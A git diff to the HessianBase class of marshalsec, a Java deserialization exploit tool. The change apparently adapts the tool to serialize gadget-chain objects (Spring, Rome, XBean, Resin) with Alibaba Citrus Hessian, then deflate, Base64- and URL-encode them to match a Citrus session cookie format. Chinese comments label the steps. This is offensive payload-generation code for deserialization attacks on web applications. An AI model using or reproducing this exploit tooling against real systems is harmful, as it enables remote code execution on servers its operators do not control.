@@ -23,31 +23,24 @@ SOFTWARE.
 package marshalsec;
 
 
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
+import com.alibaba.citrus.hessian.io.AbstractHessianOutput;
+import com.alibaba.citrus.hessian.io.Hessian2Input;
+import com.alibaba.citrus.hessian.io.WriteReplaceSerializer;
+import com.alibaba.citrus.service.requestcontext.session.encoder.SessionEncoderException;
+import marshalsec.gadgets.*;
+import org.apache.commons.codec.binary.Base64;
 
-import com.caucho.hessian.io.AbstractHessianInput;
-import com.caucho.hessian.io.AbstractHessianOutput;
-import com.caucho.hessian.io.HessianProtocolException;
-import com.caucho.hessian.io.Serializer;
-import com.caucho.hessian.io.SerializerFactory;
-import com.caucho.hessian.io.UnsafeSerializer;
-import com.caucho.hessian.io.WriteReplaceSerializer;
-
-import marshalsec.gadgets.Resin;
-import marshalsec.gadgets.Rome;
-import marshalsec.gadgets.SpringAbstractBeanFactoryPointcutAdvisor;
-import marshalsec.gadgets.SpringPartiallyComparableAdvisorHolder;
-import marshalsec.gadgets.XBean;
+import java.io.IOException;
+import java.net.URLEncoder;
+import java.util.zip.Deflater;
+import java.util.zip.DeflaterOutputStream;
 
 
 /**
- * 
  * Not applicable:
  * - BindingEnumeration/LazySearchEnumeration/ServiceLoader/ImageIO: custom conversion of Iterator
- * 
- * @author mbechler
  *
+ * @author mbechler
  */
 public abstract class HessianBase extends MarshallerBase<byte[]>
         implements SpringPartiallyComparableAdvisorHolder, SpringAbstractBeanFactoryPointcutAdvisor, Rome, XBean, Resin {
@@ -58,15 +51,56 @@ public abstract class HessianBase extends MarshallerBase<byte[]>
      * @see marshalsec.MarshallerBase#marshal(java.lang.Object)
      */
     @Override
-    public byte[] marshal ( Object o ) throws Exception {
-        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+    public byte[] marshal(Object o) throws Exception {
+//        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+//        AbstractHessianOutput out = createOutput(bos);
+//        NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
+//        sf.setAllowNonSerializable(true);
+//        out.setSerializerFactory(sf);
+//        out.writeObject(o);
+//        out.close();
+//        return bos.toByteArray();
+
+        return marshalDubbo(o);
+    }
+
+    public byte[] marshalDubbo(Object o) throws Exception {
+
+        com.alibaba.citrus.util.io.ByteArrayOutputStream bos = new com.alibaba.citrus.util.io.ByteArrayOutputStream();
         AbstractHessianOutput out = createOutput(bos);
         NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
         sf.setAllowNonSerializable(true);
         out.setSerializerFactory(sf);
         out.writeObject(o);
         out.close();
-        return bos.toByteArray();
+        com.alibaba.citrus.util.io.ByteArrayOutputStream baos = new com.alibaba.citrus.util.io.ByteArrayOutputStream();
+        // 1. 序列化
+        // 2. 压缩
+        Deflater def = new Deflater(Deflater.BEST_COMPRESSION, false);
+        DeflaterOutputStream dos = new DeflaterOutputStream(baos, def);
+        try {
+            //替换为将bos写入dos
+            dos.write(bos.toByteArray().toByteArray());
+            dos.finish();
+            dos.flush();
+        } catch (Exception e) {
+            throw new SessionEncoderException("Failed to encode session state", e);
+        } finally {
+            try {
+                dos.close();
+            } catch (IOException e) {
+            }
+
+            def.end();
+        }
+        byte[] plaintext = baos.toByteArray().toByteArray();
+
+        // 3. 加密
+         String encodedValue = new String(Base64.encodeBase64(plaintext, false), "ISO-8859-1");
+        String url = URLEncoder.encode(encodedValue, "ISO-8859-1");
+        //System.out.println(url);
+        return url.getBytes();
+
     }
 
 
@@ -76,46 +110,37 @@ public abstract class HessianBase extends MarshallerBase<byte[]>
      * @see marshalsec.MarshallerBase#unmarshal(java.lang.Object)
      */
     @Override
-    public Object unmarshal ( byte[] data ) throws Exception {
-        ByteArrayInputStream bis = new ByteArrayInputStream(data);
-        AbstractHessianInput in = createInput(bis);
+    public Object unmarshal(byte[] data) throws Exception {
+
+        com.alibaba.citrus.util.io.ByteArrayInputStream bis = new com.alibaba.citrus.util.io.ByteArrayInputStream(data);
+        Hessian2Input in = createInput(bis);
         return in.readObject();
     }
 
 
-    /**
-     * @param bos
-     * @return
-     */
-    protected abstract AbstractHessianOutput createOutput ( ByteArrayOutputStream bos );
+    protected abstract com.alibaba.citrus.hessian.io.Hessian2Output createOutput(com.alibaba.citrus.util.io.ByteArrayOutputStream bos);
+
+    protected abstract com.alibaba.citrus.hessian.io.Hessian2Input createInput(com.alibaba.citrus.util.io.ByteArrayInputStream bos);
 
 
-    protected abstract AbstractHessianInput createInput ( ByteArrayInputStream bos );
-
-    public static class NoWriteReplaceSerializerFactory extends SerializerFactory {
+    public static class NoWriteReplaceSerializerFactory extends com.alibaba.citrus.hessian.io.SerializerFactory {
 
         /**
          * {@inheritDoc}
-         *
-         * @see com.caucho.hessian.io.SerializerFactory#getObjectSerializer(java.lang.Class)
          */
-        @Override
-        public Serializer getObjectSerializer ( Class<?> cl ) throws HessianProtocolException {
+        public com.alibaba.citrus.hessian.io.Serializer getObjectSerializer(Class<?> cl) throws com.alibaba.citrus.hessian.io.HessianProtocolException {
             return super.getObjectSerializer(cl);
         }
 
 
         /**
          * {@inheritDoc}
-         *
-         * @see com.caucho.hessian.io.SerializerFactory#getSerializer(java.lang.Class)
          */
-        @Override
-        public Serializer getSerializer ( Class cl ) throws HessianProtocolException {
-            Serializer serializer = super.getSerializer(cl);
+        public com.alibaba.citrus.hessian.io.Serializer getSerializer(Class cl) throws com.alibaba.citrus.hessian.io.HessianProtocolException {
+            com.alibaba.citrus.hessian.io.Serializer serializer = super.getSerializer(cl);
 
-            if ( serializer instanceof WriteReplaceSerializer ) {
-                return UnsafeSerializer.create(cl);
+            if (serializer instanceof WriteReplaceSerializer) {
+                return com.alibaba.citrus.hessian.io.UnsafeSerializer.create(cl);
             }
             return serializer;
         }
